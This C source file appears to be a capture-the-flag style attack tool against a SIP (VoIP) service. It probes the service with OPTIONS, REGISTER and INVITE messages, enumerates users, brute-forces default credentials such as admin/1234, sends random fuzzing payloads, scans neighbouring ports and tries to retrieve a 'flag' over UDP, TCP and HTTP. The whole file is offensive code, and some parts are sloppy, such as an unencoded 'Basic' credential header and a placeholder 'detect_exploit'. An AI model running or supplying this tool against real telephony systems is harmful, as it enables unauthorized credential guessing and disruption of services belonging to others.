/*
 * Usage:
 *   Compile and run with: ./5060_sip <IP> <PORT>
 *   This code is for educational use only. Use responsibly.
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <time.h>
 #include <sys/time.h>
 #include <netinet/in.h>
 #include <fcntl.h>
 
 #define MAX_BUF 1024
 
 int send_weak_sip_data(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return -1;
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return -2;
     }
     sprintf(buffer, "OPTIONS sip:%s SIP/2.0\r\n\r\n", host);
     sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server, sizeof(server));
     memset(buffer, 0, sizeof(buffer));
     n = recv(sock, buffer, sizeof(buffer) - 1, 0);
     if (n > 0) {
         buffer[n] = '\0';
         printf("SIP response: %s\n", buffer);
     }
     close(sock);
     return 0;
 }
 
 int detect_exploit(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in target;
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return 0;
     target.sin_family = AF_INET;
     target.sin_port = htons(port);
     if (inet_pton(AF_INET, host, &target.sin_addr) <= 0) {
         close(sock);
         return 0;
     }
     sendto(sock, "ping", 4, 0, (struct sockaddr*)&target, sizeof(target));
     close(sock);
     return 1;
 }
 
 char* capture_flag(const char *host, unsigned short port) {
     static char flag[MAX_BUF];
     memset(flag, 0, sizeof(flag));
     struct sockaddr_in srv;
     socklen_t len = sizeof(srv);
     char buffer[MAX_BUF];
     int sock, n, attempts = 5;
     while (attempts--) {
         sock = socket(AF_INET, SOCK_DGRAM, 0);
         if (sock < 0) continue;
         srv.sin_family = AF_INET;
         srv.sin_port = htons(port);
         if (inet_pton(AF_INET, host, &srv.sin_addr) <= 0) {
             close(sock);
             continue;
         }
         sendto(sock, "GET_FLAG", 8, 0, (struct sockaddr*)&srv, sizeof(srv));
         struct timeval tv;
         tv.tv_sec = 2;
         tv.tv_usec = 0;
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
         memset(buffer, 0, sizeof(buffer));
         n = recvfrom(sock, buffer, sizeof(buffer) - 1, 0, (struct sockaddr*)&srv, &len);
         close(sock);
         if (n > 0) {
             buffer[n] = '\0';
             if (strstr(buffer, "FLAG") != NULL) {
                 strncpy(flag, buffer, MAX_BUF - 1);
                 break;
             }
         }
     }
     if (strlen(flag) == 0) {
         int tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
         if (tcp_sock >= 0) {
             if (connect(tcp_sock, (struct sockaddr*)&srv, sizeof(srv)) == 0) {
                 send(tcp_sock, "GET_FLAG", 8, 0);
                 memset(buffer, 0, sizeof(buffer));
                 n = recv(tcp_sock, buffer, sizeof(buffer) - 1, 0);
                 if (n > 0) {
                     buffer[n] = '\0';
                     if (strstr(buffer, "FLAG") != NULL) {
                         strncpy(flag, buffer, MAX_BUF - 1);
                     }
                 }
             }
             close(tcp_sock);
         }
     }
     if (strlen(flag) == 0) {
         int tcp_sock2 = socket(AF_INET, SOCK_STREAM, 0);
         if (tcp_sock2 >= 0) {
             fcntl(tcp_sock2, F_SETFL, O_NONBLOCK);
             connect(tcp_sock2, (struct sockaddr*)&srv, sizeof(srv));
             fd_set fdset;
             struct timeval tv;
             FD_ZERO(&fdset);
             FD_SET(tcp_sock2, &fdset);
             tv.tv_sec = 2;
             tv.tv_usec = 0;
             if (select(tcp_sock2 + 1, NULL, &fdset, NULL, &tv) == 1) {
                 int so_error;
                 socklen_t len2 = sizeof(so_error);
                 getsockopt(tcp_sock2, SOL_SOCKET, SO_ERROR, &so_error, &len2);
                 if (!so_error) {
                     char req[256];
                     snprintf(req, sizeof(req),
                              "GET /persistent_flag HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
                              host);
                     send(tcp_sock2, req, strlen(req), 0);
                     memset(buffer, 0, sizeof(buffer));
                     while ((n = recv(tcp_sock2, buffer, sizeof(buffer) - 1, 0)) > 0) {
                         buffer[n] = '\0';
                         if (strstr(buffer, "FLAG") != NULL) {
                             strncpy(flag, buffer, MAX_BUF - 1);
                             break;
                         }
                     }
                 }
             }
             close(tcp_sock2);
         }
     }
     if (strlen(flag) == 0) return NULL;
     return flag;
 }
 
 int advanced_sip_enumeration(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return -1;
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return -2;
     }
     sprintf(buffer,
         "REGISTER sip:%s SIP/2.0\r\n"
         "Via: SIP/2.0/UDP %s:%d\r\n"
         "From: <sip:enum@%s>\r\n"
         "To: <sip:enum@%s>\r\n"
         "Call-ID: 123456\r\n"
         "CSeq: 1 REGISTER\r\n\r\n",
         host, host, port, host, host
     );
     sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server, sizeof(server));
     memset(buffer, 0, sizeof(buffer));
     n = recv(sock, buffer, sizeof(buffer) - 1, 0);
     if (n > 0) {
         buffer[n] = '\0';
         printf("Enumeration response: %s\n", buffer);
     }
     close(sock);
     return 0;
 }
 
 int brute_force_sip(const char *host, unsigned short port) {
     const char *users[] = {"admin", "user", "test", NULL};
     const char *passwords[] = {"1234", "password", "admin", NULL};
     int sock, i, j;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     for (i = 0; users[i]; i++) {
         for (j = 0; passwords[j]; j++) {
             sock = socket(AF_INET, SOCK_DGRAM, 0);
             if (sock < 0) continue;
             server.sin_family = AF_INET;
             server.sin_port = htons(port);
             if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
                 close(sock);
                 continue;
             }
             sprintf(buffer,
                 "REGISTER sip:%s SIP/2.0\r\n"
                 "Via: SIP/2.0/UDP %s:%d\r\n"
                 "From: <sip:%s@%s>\r\n"
                 "To: <sip:%s@%s>\r\n"
                 "Authorization: Basic %s\r\n"
                 "Call-ID: bf-%s\r\n"
                 "CSeq: 1 REGISTER\r\n\r\n",
                 host, host, port, users[i], host, users[i], host, passwords[j], users[i]
             );
             sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server, sizeof(server));
             memset(buffer, 0, sizeof(buffer));
             recv(sock, buffer, sizeof(buffer) - 1, 0);
             close(sock);
             printf("Tried user=%s, pass=%s\n", users[i], passwords[j]);
         }
     }
     return 0;
 }
 
 void gather_sip_stats(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return;
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return;
     }
     sprintf(buffer, "INVITE sip:%s SIP/2.0\r\n\r\n", host);
     sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server, sizeof(server));
     memset(buffer, 0, sizeof(buffer));
     n = recv(sock, buffer, sizeof(buffer) - 1, 0);
     if (n > 0) {
         buffer[n] = '\0';
         printf("INVITE response: %s\n", buffer);
     }
     close(sock);
 }
 
 void sip_fuzzing(const char *host, unsigned short port, int count) {
     int sock, i;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     srand((unsigned)time(NULL));
     for (i = 0; i < count; i++) {
         sock = socket(AF_INET, SOCK_DGRAM, 0);
         if (sock < 0) continue;
         server.sin_family = AF_INET;
         server.sin_port = htons(port);
         if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
             close(sock);
             continue;
         }
         int len = rand() % (MAX_BUF - 1);
         for (int j = 0; j < len; j++) {
             buffer[j] = (char)(rand() % 94 + 32);
         }
         buffer[len] = '\0';
         sendto(sock, buffer, len, 0, (struct sockaddr*)&server, sizeof(server));
         memset(buffer, 0, sizeof(buffer));
         recv(sock, buffer, sizeof(buffer) - 1, 0);
         printf("Fuzz iteration %d response: %s\n", i + 1, buffer);
         close(sock);
     }
 }
 
 void multi_port_scan(const char *host, int start_port, int end_port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     for (int p = start_port; p <= end_port; p++) {
         sock = socket(AF_INET, SOCK_DGRAM, 0);
         if (sock < 0) continue;
         server.sin_family = AF_INET;
         server.sin_port = htons(p);
         if (inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
             close(sock);
             continue;
         }
         sprintf(buffer, "OPTIONS sip:%s SIP/2.0\r\n\r\n", host);
         sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&server, sizeof(server));
         memset(buffer, 0, sizeof(buffer));
         n = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (n > 0) {
             buffer[n] = '\0';
             printf("Port %d response: %s\n", p, buffer);
         }
         close(sock);
     }
 }
 
 int main(int argc, char *argv[]) {
     char data[] = "Sensitive SIP Data";
     printf("Sending SIP data in a weakly protected way: %s\n", data);
 
     if (argc < 3) {
         printf("Usage: %s <IP> <PORT>\n", argv[0]);
         return 1;
     }
 
     const char *ip = argv[1];
     unsigned short port = (unsigned short)atoi(argv[2]);
 
     printf("UDP check for SIP port %d on %s.\n", port, ip);
 
     if (send_weak_sip_data(ip, port) == 0) {
         printf("Weak SIP data sent.\n");
     } else {
         printf("Failed to send SIP data.\n");
     }
 
     printf("Performing advanced SIP enumeration.\n");
     advanced_sip_enumeration(ip, port);
 
     printf("Attempting brute force SIP credentials.\n");
     brute_force_sip(ip, port);
 
     printf("Gathering SIP stats with INVITE.\n");
     gather_sip_stats(ip, port);
 
     if (detect_exploit(ip, port)) {
         printf("Exploit detection logic called.\n");
     }
 
     char *found_flag = capture_flag(ip, port);
     if (found_flag && strlen(found_flag) > 0) {
         printf("Captured flag: %s\n", found_flag);
     } else {
         printf("No flag captured.\n");
     }
 
     printf("Fuzzing SIP with random payloads.\n");
     sip_fuzzing(ip, port, 5);
 
     printf("Scanning additional ports around %d.\n", port);
     multi_port_scan(ip, port - 1, port + 1);
 
     printf("Enhanced SIP operations complete.\n");
     return 0;
 }